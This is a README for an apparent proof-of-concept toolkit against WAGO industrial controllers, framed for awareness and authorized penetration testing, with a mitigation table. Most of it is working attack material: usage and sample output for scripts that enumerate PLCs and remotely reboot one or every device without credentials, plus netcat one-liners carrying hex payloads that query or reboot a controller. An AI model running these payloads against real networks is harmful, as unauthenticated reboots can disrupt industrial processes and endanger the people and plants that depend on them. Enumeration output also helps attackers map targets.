# WAGO CyberSec PoC Toolkit

A collection of tools demonstrating the security weaknesses of legacy protocols
used in WAGO PLCs. Intended for cybersecurity awareness and authorized penetration
testing only.

> ⚠️ **See disclaimer at the bottom before use.**

---

## Installation
```bash
# Clone the repository
git clone https://github.com/quenorha/cyberPoC.git
cd cyberPoC

# Install nmap (if not already installed)
# Debian / Ubuntu / WAGO Linux PLC
sudo apt install nmap

# No Python dependencies required — standard library only
```


## Tools

### `scan_codesys.py` — CODESYS Gateway Discovery (UDP/1740)

Exploits the CODESYS 3 discovery protocol to enumerate PLCs on a network.
A crafted UDP broadcast is sent to port 1740 and responses are parsed to
extract device information.

**Why it matters:** This port requires no authentication. The discovery feature
is not mandatory for CODESYS operation and should be disabled or firewalled
in production environments.

#### Usage
```bash
python3 scan_codesys.py <broadcast_address> [options]

Options:
  --source-ip   Local IP to use as source (auto-detected if omitted)
  --format      Output format: table (default) or json
  --timeout     Listening timeout in seconds (default: 3)
```

#### Example
```bash
python3 scan_codesys.py 192.168.1.255
```
```
IP Address       Device Name          Complete Name                            Manufacturer         MAC Address
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
192.168.1.12     PFC300-68415F        WAGO 750-8302 PFC300 2ETH RS             WAGO                 0030DE684161
192.168.1.4      PFC200V3-48117C      WAGO 750-8210 PFC200 G2 4ETH             WAGO                 0030DE48117C
192.168.1.5      0030DE5A9782         750-8001 Basic Controller 100 2ETH       WAGO GmbH & Co. KG   0030DE5A9782
```

---

### `wagoservice.py` — WAGO Service Port (TCP/6626)

Exploits the unauthenticated WAGO Service protocol used by legacy tools
such as *WAGO Ethernet Settings* and *WAGO I/O Check*. Allows device
enumeration and remote reboot with no credentials required.

**Why it matters:**
- *WAGO Ethernet Settings* should be replaced by the Web Based Management (WBM), which supports authentication and HTTPS.
- *WAGO I/O Check* should only be used during commissioning, on an isolated network segment.

#### Usage
```bash
python3 wagoservice.py <command> <ip|network>

Commands:
  discover  <network>   Scan network and display device info
  restart   <ip>        Reboot a single device
  restart   <network>   Reboot ALL devices on the network — use with caution
```

#### Example
```bash
python3 wagoservice.py discover 192.168.1.0/24
```
```
+----------------------+---------------------+-----------------+----------------------+-----------------------------------------------+
| IP Address           | MAC Address         | PSN             | SW-VER               | SN                                            |
+----------------------+---------------------+-----------------+----------------------+-----------------------------------------------+
| 192.168.1.1          | 00:30:DE:0A:93:56   | 750-880         | 01.08.25(16)         | SN20121115T113608-0416146#PFC|0030DE069605   |
| 192.168.1.2          | 00:30:DE:06:96:05   | 750-8001        | 01.04.02(00)         | SN20230403T202128-1738604#BC|0030DE5A9782    |
| 192.168.1.3          | 00:30:DE:5A:97:82   | 751-9301        | 04.06.03(28)         | 37SUN31564010260470190+0000000002347218       |
| 192.168.1.4          | 00:30:DE:4E:6F:EC   | 750-8302        | 04.06.01(28)         | 37SUN31564010260575922+0000000000001690       |
+----------------------+---------------------+-----------------+----------------------+-----------------------------------------------+
4 device(s) found.
```

---

### One-liners — WAGO Service via netcat

For quick use directly from a Linux shell or from a WAGO Linux-based PLC.

#### Get device info
```bash
echo '8812020001000100000000000000000002000801' | xxd -r -p | nc 192.168.1.10 6626
```

#### Reboot device
```bash
echo '8812320001000100000000000000000002000201' | xxd -r -p | nc 192.168.1.10 6626
```

---

## Mitigation Summary

| Protocol | Port | Risk | Recommended Action |
|----------|------|------|--------------------|
| CODESYS Gateway Discovery | UDP/1740 | Device enumeration | Disable or firewall if not needed |
| WAGO Service | TCP/6626 | Unauthenticated info + reboot | Disable in production, use WBM instead |

---

## Requirements

- Python 3.6+
- `nmap` installed and in PATH (required for `discover` command)

---

## Disclaimer

This toolkit is intended **solely for legitimate and authorized use** in
cybersecurity demonstrations and assessments. You must obtain explicit
authorization from the network owner or administrator before running
these tools.

The author assumes no responsibility for unauthorized use or any damage
arising from improper application. By using this toolkit, you confirm
that you hold the necessary permissions and accept full liability for
its use. Ensure compliance with all applicable laws and regulations
regarding network scanning and cybersecurity practices.
